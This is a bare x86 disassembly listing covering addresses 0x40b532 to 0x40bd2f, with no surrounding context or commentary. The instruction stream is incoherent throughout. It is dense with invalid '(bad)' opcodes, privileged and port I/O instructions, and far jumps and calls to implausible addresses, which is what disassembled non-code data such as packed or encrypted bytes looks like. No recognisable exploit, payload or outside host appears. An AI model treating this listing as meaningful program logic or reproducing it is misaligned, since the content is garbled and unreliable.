  40b532:	dec    ebx
  40b534:	add    edi,esp
  40b536:	loopne 0x40b4fd
  40b538:	ret    
  40b539:	jmp    0xc5b4:0xf3f2e7b3
  40b540:	int3   
  40b541:	mov    ebp,0xb9ddd4cf
  40b546:	fistp  QWORD PTR [eax-0x3d3a3209]
  40b54c:	mov    esi,0x1c8c0fd
  40b552:	into   
  40b553:	add    eax,0xf7c9aaea
  40b558:	lods   al,BYTE PTR ds:[esi]
  40b559:	lods   eax,DWORD PTR ds:[esi]
  40b55a:	out    dx,al
  40b55b:	lods   al,BYTE PTR ds:[esi]
  40b55c:	in     al,0xe5
  40b55e:	rcl    ebx,1
  40b560:	iret   
  40b561:	mov    ah,0xd8
  40b563:	retf   0xf8bb
  40b566:	add    al,BYTE PTR [eax]
  40b568:	pop    es
  40b569:	fneni(8087 only) 
  40b56b:	rol    al,cl
  40b56d:	retf   0x5fb
  40b570:	std    
  40b571:	jecxz  0x40b53f
  40b573:	in     al,0xfa
  40b575:	scas   al,BYTE PTR es:[edi]
  40b576:	jmp    0xcf236d71
  40b57b:	iret   
  40b57c:	retf   0xf8d2
  40b57f:	retf   0xeaf8
  40b582:	iret   
  40b583:	jmp    0x40b55f
  40b585:	add    dh,dh
  40b587:	icebp  
  40b588:	mov    esp,0xfa04e4f4
  40b58d:	shr    bh,0xd8
  40b590:	mul    dl
  40b592:	(bad)  
  40b593:	or     ch,dl
  40b595:	fstp   st(6)
  40b597:	(bad)  
  40b598:	mov    edi,0xfbcec5d0
  40b59e:	mov    dl,0xee
  40b5a0:	out    0xd3,al
  40b5a2:	cli    
  40b5a3:	mov    ah,0xb8
  40b5a5:	shl    eax,0xf5
  40b5a8:	icebp  
  40b5a9:	shl    ch,0xc6
  40b5ac:	out    0xdd,eax
  40b5ae:	out    dx,eax
  40b5af:	xlat   BYTE PTR ds:[ebx]
  40b5b0:	add    ch,al
  40b5b2:	out    dx,al
  40b5b3:	or     eax,esp
  40b5b5:	mov    eax,0xdde9e4c3
  40b5ba:	shl    BYTE PTR [edi-0x15334a58],1
  40b5c0:	fdivr  DWORD PTR [edi-0x233102b]
  40b5c6:	fistp  QWORD PTR [esi-0x281bfa2f]
  40b5cc:	out    0xc3,eax
  40b5ce:	mov    DWORD PTR [esi+eax*8],0xffe4e300
  40b5d5:	retf   
  40b5d6:	ret    0xe1a5
  40b5d9:	mov    bl,0xb1
  40b5db:	retf   
  40b5dc:	rcl    esi,1
  40b5de:	rcr    cl,cl
  40b5e0:	mov    ah,0xfa
  40b5e2:	aam    0xcb
  40b5e4:	jmp    ecx
  40b5e6:	mov    eax,0x5fa03e1
  40b5eb:	rol    DWORD PTR ds:0xd4030ff4,0xdd
  40b5f2:	add    edi,edi
  40b5f4:	out    dx,al
  40b5f5:	stos   BYTE PTR es:[edi],al
  40b5f6:	imul   esp
  40b5f8:	shr    esi,0xf2
  40b5fb:	cmc    
  40b5fc:	enter  0xc0f4,0xd1
  40b600:	clc    
  40b601:	retf   
  40b602:	shr    dl,1
  40b604:	mov    esi,0xc1f2cde2
  40b609:	pop    es
  40b60a:	repz jecxz 0x40b5d1
  40b60d:	pop    es
  40b60e:	in     al,0xef
  40b610:	neg    bl
  40b612:	in     eax,0x12
  40b614:	cld    
  40b615:	repnz in al,0xea
  40b618:	scas   al,BYTE PTR es:[edi]
  40b619:	aad    0xf0
  40b61b:	retf   
  40b61c:	sar    BYTE PTR [edx-0x21051a52],cl
  40b622:	mov    eax,0xc0ced3bb
  40b627:	repnz in eax,0xe7
  40b62a:	ffree  st(3)
  40b62c:	aam    0xe2
  40b62e:	call   0xf9429d19
  40b633:	in     al,0xcf
  40b635:	shl    ecx,1
  40b637:	ret    
  40b638:	loopne 0x40b61b
  40b63a:	loopne 0x40b633
  40b63c:	call   0xfb0e6506
  40b641:	icebp  
  40b642:	(bad)  
  40b643:	mov    esi,0xb8d1ecbc
  40b648:	stc    
  40b649:	clc    
  40b64a:	ffree  st(4)
  40b64c:	fdivr  st,st(0)
  40b64e:	cli    
  40b64f:	loope  0x40b638
  40b651:	loop   0x40b63a
  40b653:	enter  0xc0f2,0xec
  40b657:	(bad)  
  40b658:	xlat   BYTE PTR ds:[ebx]
  40b659:	mov    dl,0xae
  40b65b:	jmp    0x40b641
  40b65d:	xlat   BYTE PTR ds:[ebx]
  40b65e:	in     al,0xb9
  40b660:	lock shr bl,cl
  40b663:	fld    QWORD PTR [edx]
  40b665:	(bad)  
  40b667:	ret    
  40b668:	stc    
  40b669:	(bad)  
  40b66a:	xlat   BYTE PTR ds:[ebx]
  40b66b:	or     al,ch
  40b66d:	rcr    bh,1
  40b66f:	rcr    esi,0x8
  40b672:	jmp    0x40b66e
  40b674:	or     dh,bl
  40b676:	int    0xc1
  40b678:	idiv   DWORD PTR [ebp-0x4d284d35]
  40b67e:	aad    0xd7
  40b680:	rcr    edi,1
  40b682:	hlt    
  40b683:	mov    ecx,0xfad7d3e2
  40b688:	(bad)  
  40b689:	jecxz  0x40b685
  40b68b:	shr    cl,1
  40b68d:	add    eax,0xdc04fae3
  40b692:	jmp    0x40b693
  40b694:	shl    BYTE PTR [edi-0x2a0d4e3d],0xe4
  40b69b:	lock lods al,BYTE PTR ds:[esi]
  40b69d:	int    0xcd
  40b69f:	in     eax,0xcd
  40b6a1:	fstp   TBYTE PTR [esi-0x25420603]
  40b6a7:	fstp   st(5)
  40b6a9:	rol    eax,1
  40b6ab:	cld    
  40b6ac:	cli    
  40b6ad:	rcr    bl,1
  40b6af:	bswap  edi
  40b6b1:	fmul   QWORD PTR [edx]
  40b6b3:	jmp    0xe2ea84ba
  40b6b8:	(bad)  
  40b6ba:	shl    DWORD PTR [ebx-0xf16133e],cl
  40b6c0:	(bad)  
  40b6c1:	iret   
  40b6c2:	in     eax,dx
  40b6c3:	ret    
  40b6c4:	jecxz  0x40b684
  40b6c6:	sti    
  40b6c7:	loop   0x40b68f
  40b6c9:	mov    ebp,0xd5d1ebf9
  40b6ce:	add    al,0xd5
  40b6d0:	retf   0xcedc
  40b6d3:	fadd   QWORD PTR [eax]
  40b6d5:	rcr    bh,0xa9
  40b6d8:	in     eax,dx
  40b6d9:	icebp  
  40b6da:	aad    0xe5
  40b6dc:	out    dx,eax
  40b6dd:	in     al,0xc0
  40b6df:	(bad)  
  40b6e0:	retf   0xecfb
  40b6e3:	repnz fldz 
  40b6e6:	(bad)  
  40b6e8:	(bad)  
  40b6e9:	fcmovnu st,st(1)
  40b6eb:	add    al,0xd8
  40b6ed:	xlat   BYTE PTR ds:[ebx]
  40b6ee:	push   es
  40b6ef:	aad    0x7
  40b6f1:	or     esp,ecx
  40b6f3:	or     eax,0xe1ebbec4
  40b6f8:	aad    0xe6
  40b6fa:	retf   
  40b6fb:	shr    BYTE PTR [eax-0x1494f0c],cl
  40b701:	cli    
  40b702:	retf   
  40b703:	mov    ecx,0xfdffe0f6
  40b708:	fcomi  st,st(4)
  40b70a:	hlt    
  40b70b:	cld    
  40b70c:	cli    
  40b70d:	fiadd  WORD PTR [edx]
  40b70f:	or     edi,ebx
  40b711:	in     al,dx
  40b712:	or     cl,ah
  40b714:	fadd   st(6),st
  40b716:	repz fdiv QWORD PTR [ecx-0x5101629]
  40b71d:	ror    dh,cl
  40b71f:	(bad)  
  40b721:	mov    dh,0xfd
  40b723:	lock leave 
  40b725:	add    eax,DWORD PTR [eax]
  40b727:	icebp  
  40b728:	in     eax,dx
  40b729:	pop    es
  40b72a:	rol    BYTE PTR [ebx],cl
  40b72c:	in     al,0xc4
  40b72e:	cld    
  40b72f:	fcmovnbe st,st(6)
  40b731:	leave  
  40b732:	stc    
  40b733:	add    al,0xf1
  40b735:	test   eax,0xf5cebfc6
  40b73a:	int    0xb7
  40b73c:	aad    0xd3
  40b73e:	out    dx,al
  40b73f:	call   0xe31d7102
  40b744:	sti    
  40b745:	sti    
  40b746:	(bad)  
  40b747:	aam    0xc1
  40b749:	repz loope 0x40b72b
  40b74c:	jecxz  0x40b759
  40b74e:	stc    
  40b74f:	add    ecx,DWORD PTR [ecx]
  40b751:	aad    0xb
  40b753:	repz cli 
  40b755:	les    ebp,FWORD PTR [edx-0x37373235]
  40b75b:	aam    0xd1
  40b75d:	mov    ecx,0xd9bbd3ba
  40b762:	(bad)  
  40b763:	retf   
  40b764:	hlt    
  40b765:	jecxz  0x40b737
  40b767:	out    0xd1,al
  40b769:	(bad)
  40b76c:	fstp   TBYTE PTR [edi-0x2b43fd3c]
  40b772:	ret    0xdde4
  40b775:	shr    cl,1
  40b777:	ror    ebp,0xb2
  40b77a:	imul   edx
  40b77c:	rcl    cl,cl
  40b77e:	retf   
  40b77f:	call   0xb9f7ae61
  40b784:	fmul   st,st(7)
  40b786:	shl    ecx,cl
  40b788:	(bad)  
  40b789:	add    DWORD PTR [eax],eax
  40b78b:	aad    0xe1
  40b78d:	aad    0xbe
  40b78f:	enter  0xe4d5,0x9
  40b793:	cld    
  40b794:	jmp    0xc5d2:0xc4dcd8af
  40b79b:	into   
  40b79c:	mov    bh,0xc7
  40b79e:	iret   
  40b79f:	in     eax,dx
  40b7a0:	mov    dh,0xb5
  40b7a2:	jmp    0xf812b961
  40b7a7:	shl    ebx,1
  40b7a9:	fcmovnb st,st(4)
  40b7ab:	sti    
  40b7ac:	(bad)  
  40b7ad:	std    
  40b7ae:	cli    
  40b7af:	clc    
  40b7b0:	fcmovne st,st(6)
  40b7b2:	dec    BYTE PTR [ebx]
  40b7b4:	or     edx,esi
  40b7b6:	int3   
  40b7b7:	iret   
  40b7b8:	mov    dl,0xc7
  40b7ba:	in     al,dx
  40b7bb:	leave  
  40b7bc:	retf   0xf9ce
  40b7bf:	in     al,dx
  40b7c0:	into   
  40b7c1:	clc    
  40b7c2:	aad    0xf9
  40b7c4:	mov    eax,0xbff7effd
  40b7c9:	cmc    
  40b7ca:	loope  0x40b78d
  40b7cc:	add    eax,0xd406d4c9
  40b7d1:	retf   
  40b7d2:	iret   
  40b7d3:	repnz (bad) 
  40b7d6:	scas   al,BYTE PTR es:[edi]
  40b7d7:	shl    dh,0xc1
  40b7da:	(bad)  
  40b7db:	in     al,0xcb
  40b7dd:	sar    bl,1
  40b7df:	call   0xba2d6cc9
  40b7e4:	add    ebx,edi
  40b7e6:	mov    edi,0xd8f9d703
  40b7eb:	lds    ecx,FWORD PTR [ecx]
  40b7ed:	cli    
  40b7ee:	add    cl,bl
  40b7f0:	call   0xeb4779fe
  40b7f5:	leave  
  40b7f6:	int    0xe2
  40b7f8:	rol    ecx,cl
  40b7fa:	leave  
  40b7fb:	call   0xb81aa7fb
  40b800:	fidiv  DWORD PTR [ebp+ecx*8-0xe062c03]
  40b807:	aad    0x6
  40b809:	(bad)  
  40b80a:	in     al,0xf1
  40b80c:	clc    
  40b80d:	in     al,0xd5
  40b80f:	out    0xee,al
  40b811:	clc    
  40b812:	(bad)  
  40b814:	enter  0xe9a9,0xc7
  40b818:	fnsave [eax-0x518443f]
  40b81e:	(bad)  
  40b820:	hlt    
  40b821:	sar    edx,1
  40b823:	fyl2xp1 
  40b825:	in     eax,dx
  40b826:	cmc    
  40b827:	call   ecx
  40b829:	int3   
  40b82a:	(bad)  
  40b82b:	repnz or dh,dh
  40b82e:	(bad)  
  40b82f:	jmp    0x40b82d
  40b831:	paddsb mm0,QWORD PTR [ecx]
  40b834:	in     eax,0xea
  40b836:	lods   eax,DWORD PTR ds:[esi]
  40b837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b839:	in     eax,dx
  40b83a:	call   0xed339b04
  40b83f:	(bad)  
  40b840:	jmp    0xe0dc:0xfbf9d1f3
  40b847:	fadd   st,st(0)
  40b849:	aad    0xfc
  40b84b:	cmc    
  40b84c:	icebp  
  40b84d:	or     ebx,eax
  40b84f:	or     DWORD PTR [edx],eax
  40b851:	add    ah,dh
  40b853:	int    0x5
  40b855:	rcr    al,1
  40b857:	test   al,0xe8
  40b859:	(bad)  
  40b85b:	cmc    
  40b85c:	mov    edx,0xc6e6e0e8
  40b861:	fdivr  st,st(0)
  40b863:	div    bl
  40b865:	in     al,dx
  40b866:	test   ch,0xd6
  40b869:	add    esp,eax
  40b86b:	inc    DWORD PTR [esi]
  40b86d:	add    edx,edi
  40b86f:	(bad)
  40b872:	call   0xc026c37c
  40b877:	loopne 0x40b83b
  40b879:	mov    dl,0xe1
  40b87b:	mov    bl,0xd7
  40b87d:	mov    ch,0xc8
  40b87f:	(bad)  
  40b880:	mov    edx,0xede2f4df
  40b885:	aad    0xf4
  40b887:	(bad)  
  40b889:	add    DWORD PTR [edx-0x1cfc222f],edi
  40b88f:	out    0xe1,al
  40b891:	cld    
  40b892:	fucomip st,st(4)
  40b894:	fst    st(3)
  40b896:	call   0xf7267785
  40b89b:	out    0xd3,eax
  40b89d:	shr    ebp,0xec
  40b8a0:	mov    dh,0xce
  40b8a2:	cld    
  40b8a3:	fmul   st,st(0)
  40b8a5:	sar    DWORD PTR [edi-0x51afd29],cl
  40b8ab:	(bad)  
  40b8ad:	rol    cl,0xc7
  40b8b0:	imul   al
  40b8b2:	into   
  40b8b3:	or     al,0x0
  40b8b5:	in     eax,0xe0
  40b8b7:	out    dx,eax
  40b8b8:	ror    ebp,0xe5
  40b8bb:	iret   
  40b8bc:	repnz (bad) 
  40b8be:	fldpi  
  40b8c0:	xlat   BYTE PTR ds:[ebx]
  40b8c1:	cld    
  40b8c2:	mov    esp,0xcdd3f2fe
  40b8c7:	(bad)  
  40b8c9:	inc    BYTE PTR ds:0xfa08f5f1
  40b8cf:	rol    BYTE PTR ds:0xf3db06e0,0xaf
  40b8d6:	out    0xbf,eax
  40b8d8:	lods   eax,DWORD PTR ds:[esi]
  40b8d9:	mov    al,0xac
  40b8db:	mov    ch,0xb4
  40b8dd:	loope  0x40b898
  40b8df:	mov    al,0xb6
  40b8e1:	in     eax,dx
  40b8e2:	jmp    0x40b8b5
  40b8e4:	repnz repnz rcr ecx,cl
  40b8e8:	rcl    al,cl
  40b8ea:	icebp  
  40b8eb:	sti    
  40b8ec:	icebp  
  40b8ed:	icebp  
  40b8ee:	mov    esi,0xf4dcf8f4
  40b8f3:	shl    eax,cl
  40b8f5:	mov    edi,0xede0cfe5
  40b8fa:	iret   
  40b8fb:	sar    dl,0xea
  40b8fe:	in     al,0xf8
  40b900:	mov    edx,0xdbd8efcd
  40b905:	fcmovne st,st(5)
  40b907:	iret   
  40b908:	out    0x5,al
  40b90a:	fdiv   st(4),st
  40b90c:	les    eax,FWORD PTR [eax]
  40b90e:	(bad)  
  40b910:	fmul   DWORD PTR [ecx*1-0x50461f37]
  40b917:	test   al,0xc5
  40b919:	aad    0xaa
  40b91b:	hlt    
  40b91c:	stc    
  40b91d:	retf   
  40b91e:	out    0xef,al
  40b920:	fdivrp st(2),st
  40b922:	out    dx,eax
  40b923:	imul   edx
  40b925:	(bad)  
  40b927:	repnz cmc 
  40b929:	out    0xd1,eax
  40b92b:	(bad)
  40b92e:	cmc    
  40b92f:	leave  
  40b930:	(bad)  
  40b931:	(bad)  
  40b932:	out    dx,eax
  40b933:	fcos   
  40b935:	mov    ebp,0xb3e7eee8
  40b93b:	lods   al,BYTE PTR ds:[esi]
  40b93c:	test   al,0xcd
  40b93e:	out    0xf8,al
  40b940:	fbstp  TBYTE PTR [esi+ebp*8-0x33003124]
  40b947:	out    0xd2,eax
  40b949:	hlt    
  40b94a:	mov    esi,0x4c606c3
  40b94f:	jmp    0xa28a263
  40b954:	out    0xd8,eax
  40b956:	(bad)  
  40b957:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b958:	shl    ebp,cl
  40b95a:	int3   
  40b95b:	test   cl,0xb5
  40b95e:	into   
  40b95f:	fidivr WORD PTR [esi-0x250f424d]
  40b965:	cmc    
  40b966:	rcl    bh,1
  40b968:	out    0xe4,eax
  40b96a:	in     al,0xf6
  40b96c:	rol    BYTE PTR ds:0xdae400be,0xcb
  40b973:	jecxz  0x40b94d
  40b975:	repz call 0xf1308b23
  40b97b:	out    0xef,eax
  40b97d:	hlt    
  40b97e:	(bad)  
  40b980:	cmc    
  40b981:	int3   
  40b982:	out    dx,eax
  40b983:	fstp   st(6)
  40b985:	std    
  40b986:	repz sar DWORD PTR [eax-0x14392222],0x5
  40b98e:	cli    
  40b98f:	fxch   st(3)
  40b991:	retf   
  40b992:	adc    ebp,esp
  40b994:	shr    BYTE PTR [edx-0x333f0c30],0xe1
  40b99b:	jmp    0xfab6:0xf5c5d1d4
  40b9a2:	mov    ah,0xcf
  40b9a4:	mov    edi,0xfa01dfdd
  40b9a9:	in     al,dx
  40b9aa:	out    0xf6,al
  40b9ac:	loopne 0x40b97f
  40b9ae:	retf   
  40b9af:	wbinvd 
  40b9b1:	add    eax,0xe5ddecc9
  40b9b6:	iret   
  40b9b7:	loope  0x40b9b0
  40b9b9:	jmp    0xfa36b17f
  40b9be:	scas   al,BYTE PTR es:[edi]
  40b9bf:	into   
  40b9c0:	les    edi,FWORD PTR [eax-0x2a320225]
  40b9c6:	(bad)  
  40b9c8:	(bad)  
  40b9ca:	add    al,0xe5
  40b9cc:	out    0x1,eax
  40b9ce:	in     eax,0xf4
  40b9d0:	fucomp st(4)
  40b9d2:	repz (bad) 
  40b9d5:	jmp    0xbd308699
  40b9da:	mov    bl,0xb6
  40b9dc:	fcmovne st,st(6)
  40b9de:	int3   
  40b9df:	(bad)  
  40b9e2:	mov    edi,0xc8cecefc
  40b9e7:	cli    
  40b9e8:	out    dx,al
  40b9e9:	loope  0x40b9ee
  40b9eb:	add    al,0xfc
  40b9ed:	icebp  
  40b9ee:	call   0xc60eb7d3
  40b9f3:	(bad)  
  40b9f5:	leave  
  40b9f6:	les    edi,FWORD PTR [esi-0x2d323032]
  40b9fc:	sar    BYTE PTR [edx-0x22320114],0xd1
  40ba03:	cld    
  40ba04:	fnstsw WORD PTR [edi-0x28284724]
  40ba0a:	rcr    ebx,cl
  40ba0c:	add    esi,edi
  40ba0e:	jmp    0xf8c9:0xf4e6ee04
  40ba15:	out    0xf1,eax
  40ba17:	(bad)  
  40ba19:	repnz rol ebp,0xc9
  40ba1d:	leave  
  40ba1e:	fcmovne st,st(0)
  40ba20:	aam    0xff
  40ba22:	mov    edx,0xf3fbe9cb
  40ba27:	shl    dh,cl
  40ba29:	hlt    
  40ba2a:	in     al,dx
  40ba2b:	sar    ecx,0xcb
  40ba2e:	add    ebx,edi
  40ba30:	in     al,0xfe
  40ba32:	loopne 0x40ba30
  40ba34:	int    0xbd
  40ba36:	jmp    0xec2d910d
  40ba3b:	shl    DWORD PTR [edx-0x39274d36],cl
  40ba41:	shl    dl,1
  40ba43:	aam    0xbd
  40ba45:	clc    
  40ba46:	dec    bh
  40ba48:	shl    eax,0xe4
  40ba4b:	(bad)  
  40ba4c:	fsubp  st(1),st
  40ba4e:	sti    
  40ba4f:	loop   0x40ba31
  40ba51:	or     al,0xd8
  40ba53:	retf   0xcc01
  40ba56:	stos   BYTE PTR es:[edi],al
  40ba57:	shr    ebx,1
  40ba59:	lods   eax,DWORD PTR ds:[esi]
  40ba5a:	leave  
  40ba5b:	mov    ebx,0xedf8dbec
  40ba60:	xlat   BYTE PTR ds:[ebx]
  40ba61:	cmc    
  40ba62:	mov    ecx,0xfe03ddee
  40ba67:	cld    
  40ba68:	fdivp  st(6),st
  40ba6a:	les    eax,FWORD PTR [ecx+esi*8]
  40ba6d:	jmp    0xd06:0xc4c8ddfd
  40ba74:	add    al,0xdd
  40ba76:	in     eax,0xf3
  40ba78:	shl    BYTE PTR [ebx-0x1f3a1210],1
  40ba7e:	out    0xdb,al
  40ba80:	mov    ebx,0xd6bdf6e8
  40ba85:	fcmovbe st,st(1)
  40ba87:	icebp  
  40ba88:	div    edi
  40ba8a:	cmc    
  40ba8b:	cmc    
  40ba8c:	rcr    al,cl
  40ba8e:	loope  0x40ba96
  40ba90:	(bad)  
  40ba91:	call   0xc646975e
  40ba96:	rol    eax,1
  40ba98:	rol    ah,0xb4
  40ba9b:	into   
  40ba9c:	(bad)  
  40ba9d:	int3   
  40ba9e:	aam    0xb5
  40baa0:	jmp    0x40ba87
  40baa2:	xlat   BYTE PTR ds:[ebx]
  40baa3:	out    dx,al
  40baa4:	mov    esi,0xd1ced1c2
  40baa9:	clc    
  40baaa:	(bad)  
  40baab:	jmp    0x6fe:0xff01c0da
  40bab2:	cli    
  40bab3:	in     eax,0xe7
  40bab5:	(bad)  
  40bab7:	lock (bad) 
  40bab9:	not    ecx
  40babb:	jecxz  0x40bab2
  40babd:	mov    ah,0xb7
  40babf:	lods   eax,DWORD PTR ds:[esi]
  40bac0:	leave  
  40bac1:	into   
  40bac2:	out    dx,al
  40bac3:	mov    esp,0xefd102ba
  40bac8:	fsubr  st(3),st
  40baca:	aam    0xd5
  40bacc:	stc    
  40bacd:	ret    0xf6d6
  40bad0:	retf   
  40bad1:	push   cs
  40bad2:	jmp    0xde1fa7ea
  40bad7:	call   0xf42c8480
  40badc:	cli    
  40badd:	in     eax,0xd4
  40badf:	(bad)  
  40bae0:	idiv   ebx
  40bae2:	in     al,dx
  40bae3:	hlt    
  40bae4:	retf   0xfadb
  40bae7:	(bad)  
  40bae9:	rol    ah,cl
  40baeb:	add    al,al
  40baed:	fdivp  st(3),st
  40baef:	fmul   DWORD PTR [ecx]
  40baf1:	or     DWORD PTR [ecx],ecx
  40baf3:	repnz in al,dx
  40baf5:	rol    eax,cl
  40baf7:	in     al,0xf5
  40baf9:	lock jmp 0xb8d2:0xbbced6cc
  40bb01:	in     al,0xdb
  40bb03:	icebp  
  40bb04:	loope  0x40bafd
  40bb06:	out    0xbd,eax
  40bb08:	xlat   BYTE PTR ds:[ebx]
  40bb09:	rcr    ebx,1
  40bb0b:	in     eax,0xe1
  40bb0d:	retf   0xc7e1
  40bb10:	(bad)  
  40bb11:	fcmovu st,st(6)
  40bb13:	std    
  40bb14:	loop   0x40babf
  40bb16:	call   0xd11172e9
  40bb1b:	lods   al,BYTE PTR ds:[esi]
  40bb1c:	not    ah
  40bb1e:	aam    0xf1
  40bb20:	repnz mov edi,0xfbdfedf4
  40bb26:	jecxz  0x40bb02
  40bb28:	sti    
  40bb29:	vpavgw xmm3,xmm3,xmm1
  40bb2d:	out    0xc0,eax
  40bb2f:	fcmovnu st,st(2)
  40bb31:	enter  0x3e2,0xf2
  40bb35:	iret   
  40bb36:	enter  0xc6e2,0xcd
  40bb3a:	icebp  
  40bb3b:	shl    DWORD PTR [edi-0x2c380e1b],1
  40bb41:	xlat   BYTE PTR ds:[ebx]
  40bb42:	in     eax,dx
  40bb43:	(bad)  
  40bb44:	out    dx,al
  40bb45:	loop   0x40bb24
  40bb47:	(bad)  
  40bb48:	out    0xd5,eax
  40bb4a:	loop   0x40bb1e
  40bb4c:	jecxz  0x40bb54
  40bb4e:	stc    
  40bb4f:	loope  0x40bb54
  40bb51:	call   0xce4cae1c
  40bb56:	mov    ebp,0xbcd5eeb3
  40bb5b:	aam    0xe6
  40bb5d:	stc    
  40bb5e:	sti    
  40bb5f:	imul   edi
  40bb61:	sti    
  40bb62:	(bad)  
  40bb63:	cli    
  40bb64:	ret    0xd4e9
  40bb67:	fstp   st(7)
  40bb69:	add    ebx,ebx
  40bb6b:	add    eax,0xebd4e1f6
  40bb70:	retf   
  40bb71:	out    0xc4,eax
  40bb73:	paddusw mm0,mm7
  40bb76:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb78:	div    edx
  40bb7a:	jmp    0xc130ae6a
  40bb7f:	in     al,dx
  40bb80:	imul   ebp
  40bb82:	cld    
  40bb83:	repz jecxz 0x40bb68
  40bb86:	shl    eax,1
  40bb88:	jecxz  0x40bb4d
  40bb8a:	rcl    ch,cl
  40bb8c:	ret    0xdffa
  40bb8f:	out    dx,al
  40bb90:	fsincos 
  40bb92:	stc    
  40bb93:	adc    cl,BYTE PTR ds:0xc0cae7e1
  40bb99:	out    dx,eax
  40bb9a:	rol    bh,1
  40bb9c:	stc    
  40bb9d:	fcmovne st,st(2)
  40bb9f:	les    edi,FWORD PTR [esi-0x647024d]
  40bba5:	mov    ebx,0xf3dcc0b6
  40bbaa:	mov    edx,0xc1f4c701
  40bbaf:	(bad)  
  40bbb1:	fmul   st(7),st
  40bbb3:	jmp    0xc5c1:0xf3e4e4f1
  40bbba:	loopne 0x40bbaf
  40bbbc:	cli    
  40bbbd:	(bad)  
  40bbbe:	mov    ebx,0xbdbbd4d6
  40bbc3:	lock rol DWORD PTR [eax],1
  40bbc6:	(bad)  
  40bbc8:	loopne 0x40bba2
  40bbca:	mov    ebp,0xf9dd0502
  40bbcf:	(bad)  
  40bbd0:	fsubr  st(6),st
  40bbd2:	(bad)  
  40bbd3:	cli    
  40bbd4:	or     eax,0xe1b1bfe5
  40bbd9:	aam    0xcf
  40bbdb:	sar    edx,cl
  40bbdd:	(bad)  
  40bbde:	retf   
  40bbdf:	aam    0xda
  40bbe1:	call   0xb82998e1
  40bbe6:	rcr    ah,0xd9
  40bbe9:	test   eax,0xcbc400fb
  40bbef:	jmp    0xe20d:0xf2cf020a
  40bbf6:	icebp  
  40bbf7:	loop   0x40bbde
  40bbf9:	jmp    0xb4b7:0xdbd0e5db
  40bc00:	retf   0xf0fb
  40bc03:	mov    ebx,0x7fce2fe
  40bc08:	aam    0xda
  40bc0a:	(bad)  
  40bc0b:	jmp    0xfe9:0xe4fadcf1
  40bc12:	retf   
  40bc13:	fstp   st(5)
  40bc15:	scas   al,BYTE PTR es:[edi]
  40bc16:	fmul   st(0),st
  40bc18:	(bad)  
  40bc19:	lods   eax,DWORD PTR ds:[esi]
  40bc1a:	mov    cl,0xc4
  40bc1c:	aam    0xe8
  40bc1e:	cmc    
  40bc1f:	in     eax,dx
  40bc20:	(bad)
  40bc23:	sar    BYTE PTR [ecx+ecx*8-0x3c3e4210],1
  40bc2a:	add    eax,0xcb08e6d0
  40bc2f:	or     ch,dh
  40bc31:	fucom  st(0)
  40bc33:	repz adc ch,dh
  40bc36:	ret    
  40bc37:	ror    ch,0xe6
  40bc3a:	hlt    
  40bc3b:	mov    ah,0xbb
  40bc3d:	fidiv  DWORD PTR [ebp-0x1c171545]
  40bc43:	icebp  
  40bc44:	hlt    
  40bc45:	add    dh,BYTE PTR [esi-0x14fb0926]
  40bc4b:	std    
  40bc4c:	jecxz  0x40bc4e
  40bc4e:	retf   0xcaeb
  40bc51:	or     ah,cl
  40bc53:	in     al,dx
  40bc54:	loopne 0x40bc12
  40bc56:	ffree  st(5)
  40bc58:	loope  0x40bc1f
  40bc5a:	shl    ecx,0xd4
  40bc5d:	mov    ecx,0xf4d3b1c6
  40bc62:	enter  0xdad5,0x3
  40bc66:	fcomip st,st(1)
  40bc68:	(bad)  
  40bc69:	fdivr  st,st(4)
  40bc6b:	mov    ecx,0x8eac6f1
  40bc70:	inc    ch
  40bc72:	iret   
  40bc73:	retf   
  40bc74:	add    ecx,ebp
  40bc76:	xlat   BYTE PTR ds:[ebx]
  40bc77:	in     al,dx
  40bc78:	out    0xbd,al
  40bc7a:	repnz mov cl,0xba
  40bc7d:	shl    al,1
  40bc7f:	div    BYTE PTR [edi-0x440d3016]
  40bc85:	add    edx,esi
  40bc87:	jmp    ecx
  40bc89:	fld    st(2)
  40bc8b:	fcomp  st(6)
  40bc8d:	mov    edi,0xe4faf4fb
  40bc92:	clc    
  40bc93:	loope  0x40bc7f
  40bc95:	loopne 0x40bc5a
  40bc97:	int3   
  40bc98:	in     eax,dx
  40bc99:	leave  
  40bc9a:	aad    0xb7
  40bc9c:	retf   0xd2e8
  40bc9f:	mov    cl,0xcb
  40bca1:	int    0xf5
  40bca3:	iret   
  40bca4:	retf   0xbdba
  40bca7:	imul   esi
  40bca9:	jmp    edx
  40bcab:	fdivp  st(5),st
  40bcad:	idiv   al
  40bcaf:	(bad)  
  40bcb0:	(bad)  
  40bcb2:	or     eax,0xcef3ebcd
  40bcb7:	enter  0xc7b0,0xea
  40bcbb:	sti    
  40bcbc:	(bad)  
  40bcbd:	fcmovnu st,st(0)
  40bcbf:	mov    eax,0xebbbfddd
  40bcc4:	fistp  QWORD PTR [ebp+0x2edf6ef]
  40bcca:	add    edi,edx
  40bccc:	retf   0xe6dc
  40bccf:	(bad)  
  40bcd0:	sti    
  40bcd1:	add    eax,0xc1c0eaef
  40bcd6:	mov    edi,0xe8cfc9d7
  40bcdb:	mov    cl,0xb1
  40bcdd:	in     al,dx
  40bcde:	cmc    
  40bcdf:	icebp  
  40bce0:	repnz in eax,0xf5
  40bce3:	lock leave 
  40bce5:	int3   
  40bce6:	sti    
  40bce7:	jecxz  0x40bcbf
  40bce9:	(bad)
  40bcec:	or     edi,DWORD PTR [edi-0x1d36420c]
  40bcf2:	out    0xde,eax
  40bcf4:	out    dx,al
  40bcf5:	shl    edi,0xaf
  40bcf8:	loope  0x40bce6
  40bcfa:	out    0xb3,al
  40bcfc:	hlt    
  40bcfd:	in     al,dx
  40bcfe:	mov    al,0xd8
  40bd00:	stc    
  40bd01:	leave  
  40bd02:	cmc    
  40bd03:	call   0xd43291da
  40bd08:	ret    
  40bd09:	in     al,0xf2
  40bd0b:	add    al,0xb8
  40bd0d:	add    bh,bl
  40bd0f:	add    al,0xc7
  40bd11:	retf   0xc9e2
  40bd14:	out    0xf1,eax
  40bd16:	jmp    0xcce9:0xc4f2bce2
  40bd1d:	loopne 0x40bce3
  40bd1f:	shr    bl,1
  40bd21:	fld    DWORD PTR [ebx]
  40bd23:	jecxz  0x40bd23
  40bd25:	mov    edi,0xf9debdf4
  40bd2a:	mov    ebp,0xc7eb03f7
  40bd2f:	xlat   BYTE PTR ds:[ebx]
